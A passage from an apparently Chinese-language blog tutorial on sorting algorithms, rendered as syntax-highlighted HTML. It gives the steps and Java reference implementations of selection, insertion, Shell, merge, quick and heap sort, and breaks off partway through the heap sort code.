class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//Java 代码实现</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SelectionSort</span> <span class="token keyword">implements</span> <span class="token class-name">IArraySort</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sourceArray<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>sourceArray<span class="token punctuation">,</span> sourceArray<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 总共要经过 N-1 轮比较</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> min <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 每轮需要比较的次数 N-i</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>min<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// 记录目前能找到的最小值元素的下标</span>                    min <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 将找到的最小值和i位置所在的值进行交换</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> min<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> tmp <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>min<span class="token punctuation">]</span><span class="token punctuation">;</span>                arr<span class="token punctuation">[</span>min<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="3-插入排序"><a href="#3-插入排序" class="headerlink" title="3. 插入排序"></a>3. 插入排序</h3><h4 id="3-1-算法步骤"><a href="#3-1-算法步骤" class="headerlink" title="3.1 算法步骤"></a>3.1 算法步骤</h4><ul><li>将第一待排序序列第一个元素看做一个有序序列，把第二个元素到最后一个元素当成是未排序序列。</li><li>从头到尾依次扫描未排序序列，将扫描到的每个元素插入有序序列的适当位置。（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面。）</li></ul><h4 id="3-2-动画演示"><a href="#3-2-动画演示" class="headerlink" title="3.2 动画演示"></a>3.2 动画演示</h4><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/插入排序.gif"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/插入排序.gif" alt="img"></a>插入排序动画演示</p><h4 id="3-3-参考代码"><a href="#3-3-参考代码" class="headerlink" title="3.3 参考代码"></a>3.3 参考代码</h4><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//Java 代码实现</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InsertSort</span> <span class="token keyword">implements</span> <span class="token class-name">IArraySort</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sourceArray<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 对 arr 进行拷贝，不改变参数内容</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>sourceArray<span class="token punctuation">,</span> sourceArray<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 从下标为1的元素开始选择合适的位置插入，因为下标为0的只有一个元素，默认是有序的</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 记录要插入的数据</span>            <span class="token keyword">int</span> tmp <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 从已经排序的序列最右边的开始比较，找到比其小的数</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> tmp <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                j<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 存在比其小的数，插入</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">!=</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="4-希尔排序"><a href="#4-希尔排序" class="headerlink" title="4. 希尔排序"></a>4. 希尔排序</h3><h4 id="4-1-算法步骤"><a href="#4-1-算法步骤" class="headerlink" title="4.1 算法步骤"></a>4.1 算法步骤</h4><ul><li>选择一个增量序列 t1，t2，……，tk，其中 ti &gt; tj, tk = 1；</li><li>按增量序列个数 k，对序列进行 k 趟排序；</li><li>每趟排序，根据对应的增量 ti，将待排序列分割成若干长度为 m 的子序列，分别对各子表进行直接插入排序。仅增量因子为 1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</li></ul><h4 id="4-2-动画演示"><a href="#4-2-动画演示" class="headerlink" title="4.2 动画演示"></a>4.2 动画演示</h4><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/希尔排序.gif"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/希尔排序.gif" alt="img"></a>希尔排序动画演示</p><h4 id="4-3-参考代码"><a href="#4-3-参考代码" class="headerlink" title="4.3 参考代码"></a>4.3 参考代码</h4><pre class=" language-java"><code class="language-java"> <span class="token comment" spellcheck="true">//Java 代码实现</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ShellSort</span> <span class="token keyword">implements</span> <span class="token class-name">IArraySort</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sourceArray<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 对 arr 进行拷贝，不改变参数内容</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>sourceArray<span class="token punctuation">,</span> sourceArray<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> gap <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>gap <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>            gap <span class="token operator">=</span> gap <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>gap <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> gap<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> tmp <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">-</span> gap<span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> tmp<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    arr<span class="token punctuation">[</span>j <span class="token operator">+</span> gap<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                    j <span class="token operator">-=</span> gap<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                arr<span class="token punctuation">[</span>j <span class="token operator">+</span> gap<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            gap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>gap <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="5-归并排序"><a href="#5-归并排序" class="headerlink" title="5. 归并排序"></a>5. 归并排序</h3><h4 id="5-1-算法步骤"><a href="#5-1-算法步骤" class="headerlink" title="5.1 算法步骤"></a>5.1 算法步骤</h4><ul><li>申请空间，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列；</li><li>设定两个指针，最初位置分别为两个已经排序序列的起始位置；</li><li>比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置；</li><li>重复步骤 3 直到某一指针达到序列尾；</li><li>将另一序列剩下的所有元素直接复制到合并序列尾。</li></ul><h4 id="5-2-动画演示"><a href="#5-2-动画演示" class="headerlink" title="5.2 动画演示"></a>5.2 动画演示</h4><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/归并排序.gif"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/归并排序.gif" alt="img"></a>归并排序动画演示</p><h4 id="5-3-参考代码"><a href="#5-3-参考代码" class="headerlink" title="5.3 参考代码"></a>5.3 参考代码</h4><pre class=" language-java"><code class="language-java"> <span class="token comment" spellcheck="true">//Java 代码实现</span>   <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MergeSort</span> <span class="token keyword">implements</span> <span class="token class-name">IArraySort</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sourceArray<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 对 arr 进行拷贝，不改变参数内容</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>sourceArray<span class="token punctuation">,</span> sourceArray<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> arr<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> middle <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> left <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> middle<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> right <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> middle<span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token function">sort</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">sort</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>left<span class="token punctuation">.</span>length <span class="token operator">+</span> right<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>left<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> right<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>left<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> right<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                result<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> left<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                left <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> left<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                result<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> right<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                right <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>right<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>left<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            result<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> left<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            left <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> left<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>right<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            result<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> right<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            right <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>right<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="6-快速排序"><a href="#6-快速排序" class="headerlink" title="6. 快速排序"></a>6. 快速排序</h3><h4 id="6-1-算法步骤"><a href="#6-1-算法步骤" class="headerlink" title="6.1 算法步骤"></a>6.1 算法步骤</h4><ul><li>从数列中挑出一个元素，称为 “基准”（pivot）;</li><li>重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；</li><li>递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序；</li></ul><h4 id="6-2-动画演示"><a href="#6-2-动画演示" class="headerlink" title="6.2 动画演示"></a>6.2 动画演示</h4><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/快速排序.gif"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/快速排序.gif" alt="img"></a>快速排序动画演示</p><h4 id="6-3-参考代码"><a href="#6-3-参考代码" class="headerlink" title="6.3 参考代码"></a>6.3 参考代码</h4><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//Java 代码实现</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">QuickSort</span> <span class="token keyword">implements</span> <span class="token class-name">IArraySort</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sourceArray<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 对 arr 进行拷贝，不改变参数内容</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>sourceArray<span class="token punctuation">,</span> sourceArray<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">quickSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> partitionIndex <span class="token operator">=</span> <span class="token function">partition</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> left<span class="token punctuation">,</span> partitionIndex <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">quickSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> partitionIndex <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">partition</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 设定基准值（pivot）</span>        <span class="token keyword">int</span> pivot <span class="token operator">=</span> left<span class="token punctuation">;</span>        <span class="token keyword">int</span> index <span class="token operator">=</span> pivot <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> index<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> right<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> i<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>                index<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> pivot<span class="token punctuation">,</span> index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="7-堆排序"><a href="#7-堆排序" class="headerlink" title="7. 堆排序"></a>7. 堆排序</h3><h4 id="7-1-算法步骤"><a href="#7-1-算法步骤" class="headerlink" title="7.1 算法步骤"></a>7.1 算法步骤</h4><ul><li>创建一个堆 H[0……n-1]；</li><li>把堆首（最大值）和堆尾互换；</li><li>把堆的尺寸缩小 1，并调用 shift_down(0)，目的是把新的数组顶端数据调整到相应位置；</li><li>重复步骤 2，直到堆的尺寸为 1。</li></ul><h4 id="7-2-动画演示"><a href="#7-2-动画演示" class="headerlink" title="7.2 动画演示"></a>7.2 动画演示</h4><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/堆排序.gif"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/堆排序.gif" alt="img"></a>堆排序动画演示</p><h4 id="7-3-参考代码"><a href="#7-3-参考代码" class="headerlink" title="7.3 参考代码"></a>7.3 参考代码</h4><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//Java 代码实现</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HeapSort</span> <span class="token keyword">implements</span> <span class="token class-name">IArraySort</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sourceArray<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 对 arr 进行拷贝，不改变参数内容</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>sourceArray<span class="token punctuation">,</span> sourceArray<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token function">buildMaxHeap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            len<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token function">heapify</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> arr<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">buildMaxHeap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> Math<span 